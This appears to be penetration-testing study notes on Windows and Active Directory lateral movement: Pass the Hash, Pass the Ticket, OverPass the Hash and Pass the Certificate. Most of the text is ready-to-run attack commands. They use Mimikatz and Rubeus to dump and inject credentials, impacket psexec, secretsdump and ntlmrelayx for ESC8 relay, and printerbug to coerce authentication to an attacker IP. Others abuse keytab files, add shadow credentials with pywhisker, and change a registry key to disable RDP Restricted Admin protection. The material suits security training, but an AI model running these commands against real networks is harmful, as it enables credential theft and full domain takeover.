# Alternative Windows authentications

Here we will look at other ways we can use to authenticate ourselves in Windows environments, such as:
- Pass the Hash
- Pass the Ticket
- Pass the Certificate

## Pass the Hash (PtH)

A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

Hashes can be obtained in several ways, including:
- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).

**Pass the Hash from Windows Using Mimikatz**
````
> mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe" exit
````
**Pass the Hash with PowerShell Invoke-TheHash (Windows)**

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:
- Target - Hostname or IP address of the target.
- Username - Username to use for authentication.
- Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
````
> Import-Module .\Invoke-TheHash.psd1
> Invoke-SMBExec -Target <IP> -Domain <domain> -Username <user> -Hash <hash> -Command "<command>" -Verbose
````

**Pass the Hash with Impacket (Linux)**
````
impacket-psexec <user>@<ip> -hashes :<hash>
````
The same concept applies to secrectsdump and other impacket tools.

**Pass the Hash with NetExec (Linux)**

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer.
````
# netexec smb <IP> -u <user> -d . -H <hash>
# netexec smb <IP> -u <user> -d . -H <hash> -x whoami
````

**Pass the Hash with evil-winrm (Linux)**
````
$ evil-winrm -i <IP> -u <user> -H <hash>
````

**Pass the Hash with RDP (Linux)**
````
Reg Key: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
$ xfreerdp  /v:<IP> /u:<user> /pth:<hash>
````

## Pass the Ticket (PtT)

Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.
- The Ticket Granting Ticket (TGT) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS.
- The Ticket Granting Service (TGS) is requested by users who want to use a service. These tickets allow services to verify the user's identity.
If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to the Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

**Pass the Ticket (PtT) attack**

We need a valid Kerberos ticket to perform a Pass the Ticket (PtT) attack. It can be:
- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

### from Windows

**Mimikatz - Export tickets**
````
# privilege::debug
# sekurlsa::tickets /export

> dir *.kirbi
[0;6c680]-2-0-40e10000-plaintext@krbtgt-domain.kirbi
[0;3e7]-0-2-40a50000-DC01$@cifs-DC01.domain.kirbi
````
The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.

**Rubeus - Export tickets**
````
> Rubeus.exe dump /nowrap
````

**Rubeus - Pass the Ticket**
````
> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
Note that now it displays Ticket successfully imported!.
````
````
Another way is to import the ticket into the current session using the .kirbi file from the disk.
> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
````
````
Pass the Ticket - Base64 Format
Convert .kirbi to Base64 Format
> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
> Rubeus.exe ptt /ticket:<base64>
````

**Mimikatz - Pass the Ticket**
````
# privilege::debug
# kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
````

**Pass The Ticket with PowerShell Remoting (Windows)**

PowerShell Remoting allows us to run scripts or commands on a remote computer. 
````
- Mimikatz -
# privilege::debug
# kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
> powershell
> Enter-PSSession -ComputerName DC01
````
````
- Rubeus -
> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
> Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
> powershell
> Enter-PSSession -ComputerName DC01
````

**Pass the Key aka. OverPass the Hash**

The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key aka. OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket Granting Ticket (TGT). 

**Mimikaz**
````
- Extract Kerberos keys -
# privilege::debug
# sekurlsa::ekeys

Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash aka. Pass the Key

# privilege::debug
# sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<rc4_hmac_nt>
This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
````

**Rubeus**
````
> Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes256> /nowrap
````

### from Linux

In most cases, Linux machines store Kerberos tickets as ccache files in the /tmp directory. By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed.
Another everyday use of Kerberos in Linux is with keytab files. A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). 

**Identifying Linux and Active Directory integration**
````
- realm - Check if Linux machine is domain-joined -
$ realm list

In case realm is not available, we can also look for other tools used to integrate Linux with Active Directory such as sssd or winbind.

- PS - Check if Linux machine is domain-joined -
$ ps -ef | grep -i "winbind\|sssd"
````

### Finding Kerberos tickets in Linux

**Finding KeyTab files**

Using Find to search for files with keytab in the name
````
$ find / -name *keytab* -ls 2>/dev/null
````

Another way to find KeyTab files is in automated scripts configured using a cronjob or any other Linux service.
Identifying KeyTab files in Cronjobs
````
$ crontab -l
````
**kinit** allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use kinit to import a keytab into our session and act as the user.

**Finding ccache files**
````
$ env | grep -i krb5

- Searching for ccache files in /tmp -
$ ls -la /tmp
````

### Abusing KeyTab files

The first thing we can do is impersonate a user using kinit. To use a keytab file, we need to know which user it was created for. klist is another application used to interact with Kerberos on Linux.

**Listing KeyTab file information**
````
$ klist -k -t /opt/specialfiles/carlos.keytab
````
**Impersonating a user with a KeyTab**
````
$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
````

**KeyTab Extract**

The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

````
- Extracting KeyTab hashes with KeyTabExtract -
$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
````

**Abusing KeyTab ccache**
````
- Importing the ccache file into our current session -
# export KRB5CCNAME=<ticket>
# klist
````


### Using Linux attack tools with Kerberos

````
Setting the KRB5CCNAME environment variable
$ export KRB5CCNAME=<ticket>
````

**Impacket**

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
````
$ impacket-wmiexec dc01 -k
````

We can issue tickets with impacket-getTGT using the following command:
````
$ impacket-getTGT <domain>/<user> -dc-ip <DC-IP> -hashes :<hash>
$ impacket-getTGT <domain>/<user> -dc-ip <DC-IP>
````

**Evil-WinRM**

To use evil-winrm with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called krb5-user.
````
$ sudo apt-get install krb5-user -y

$ cat /etc/krb5.conf
[libdefaults]
        default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = dc01.<domain>
    }

$ evil-winrm -i dc01 -r <domain>
````

### Misc

If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use impacket-ticketConverter to convert them.
````
$ impacket-ticketConverter krb5cc_647401106_I8I133 <user>.kirbi
````

**Linikatz**

Linikatz is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.
````
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
````

## Pass the Certificate

Pass-the-Certificate refers to the technique of using X.509 certificates to successfully obtain Ticket Granting Tickets (TGTs). This method is used primarily alongside attacks against Active Directory Certificate Services (AD CS), as well as in Shadow Credential attacks.

**AD CS NTLM Relay Attack (ESC8)**

ESC8—as described in the Certified Pre-Owned paper—is an NTLM relay attack targeting an ADCS HTTP endpoint.
Attackers can use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service using the following command:
````
$ impacket-ntlmrelayx -t http://<IP-Server>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
````
Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug. 
````
$ python3 printerbug.py <domain>/<user>:"<password>"@<IP-Server> <IP-Attacker>
````

We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using gettgtpkinit.py.
````
$ python3 gettgtpkinit.py -cert-pfx <cert-gotit>.pfx -dc-ip <IP-DC> '<domain>/<user-certificate>' <file>.ccache
$ export KRB5CCNAME=<file>.ccache
$ impacket-secretsdump -k -no-pass -dc-ip <IP-DC> -just-dc-user Administrator '<domain>/<user-certificate>'@<IP>
````

**Shadow Credentials (msDS-KeyCredentialLink)**

Shadow Credentials refers to an Active Directory attack that abuses the msDS-KeyCredentialLink attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the AddKeyCredentialLink edge indicates that one user has write permissions over another user's msDS-KeyCredentialLink attribute, allowing them to take control of that user.
We can use pywhisker to perform this attack from a Linux system. The command below generates an X.509 certificate and writes the public key to the victim user's msDS-KeyCredentialLink attribute:
````
https://github.com/ShutdownRepo/pywhisker
$ pywhisker --dc-ip <IP-DC> -d <domain> -u <user-controlled> -p '<password>' --target <user-target> --action add
$ python3 gettgtpkinit.py -cert-pfx <cert-gen-pywhisker>.pfx -pfx-pass '<pywhisker-pass>' -dc-ip <IP-DC> '<domain>/<user-certificate>' <file>.ccache
$ export KRB5CCNAME=/tmp/jpinkman.ccache
````

No PKINIT?
In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool PassTheCert was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). 
https://github.com/AlmondOffSec/PassTheCert/
